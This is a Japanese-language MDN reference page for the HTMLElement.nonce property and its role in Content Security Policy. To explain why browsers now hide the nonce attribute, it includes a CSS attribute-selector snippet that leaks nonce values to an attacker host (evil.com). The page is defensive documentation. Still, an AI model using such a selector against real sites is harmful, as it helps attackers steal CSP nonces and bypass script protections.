---
title: HTMLElement.nonce
slug: Web/API/HTMLElement/nonce
tags:
  - API
  - Content Security Policy
  - Experimental
  - HTML DOM
  - HTMLElement
  - Property
  - Reference
  - nonce
translation_of: Web/API/HTMLElement/nonce
original_slug: Web/API/HTMLElement/nonce
---
<div>{{APIRef("HTML DOM")}}</div>

<p><span class="seoSummary"><strong><code>nonce</code></strong> は {{DOMxRef("HTMLElement")}} ミックスインのプロパティで、特定のフェッチを続行できるかどうかを決定するためにコンテンツセキュリティポリシー (<a href="/ja/docs/Web/HTTP/CSP">Content Security Policy</a>) で使用される一度だけの暗号化番号を返します。</span></p>

<p>後の実装では、 <code>nonce</code> 属性を持つ要素はスクリプトにのみ公開します (CSS 属性セレクターのようなサイドチャネルには公開しません)。</p>

<h2 id="Examples">例</h2>

<h3 id="Retrieving_a_nonce_value">ノンス値の受け取り</h3>

<p>以前は、すべてのブラウザーが IDL 属性の <code>nonce</code> に対応しているわけではなかったので、回避策としては、代替として <code><a href="/ja/docs/Web/API/Element/getAttribute">getAttribute</a></code> を使用するようにしていました。</p>

<pre class="brush: js">let nonce = script['nonce'] || script.getAttribute('nonce');</pre>

<p>しかし、最近のバージョンのブラウザーでは、この方法でアクセスすると <code>nonce</code> の値を隠します (空の文字列が返されます)。 IDL プロパティ (<code>script['nonce']</code>) がノンスにアクセスする唯一の方法となります。</p>

<p>ノンスを隠蔽することは、攻撃者が以下のようなコンテンツ属性からデータを取得できるメカニズムを介してノンスデータを流出させることを防ぐのに役立ちます。</p>

<pre class="brush: css example-bad">script[nonce~=whatever] {
  background: url("https://evil.com/nonce?whatever");
}</pre>

<h2 id="Specifications">仕様書</h2>

<table class="standard-table">
 <thead>
  <tr>
   <th scope="col">仕様書</th>
  </tr>
 </thead>
 <tbody>
  <tr>
   <td>{{SpecName('HTML WHATWG','#attr-nonce','nonce')}}</td>
  </tr>
 </tbody>
</table>

<h2 id="Browser_compatibility">ブラウザーの互換性</h2>

<p>{{Compat("api.HTMLElement.nonce")}}</p>

<h2 id="See_also">関連情報</h2>

<ul>
 <li><a href="/ja/docs/Web/HTML/Global_attributes/nonce"><code>nonce</code> グローバル属性</a></li>
 <li><a href="/ja/docs/Web/HTTP/CSP">コンテンツセキュリティポリシー</a></li>
 <li>CSP: {{CSP("script-src")}}</li>
</ul>
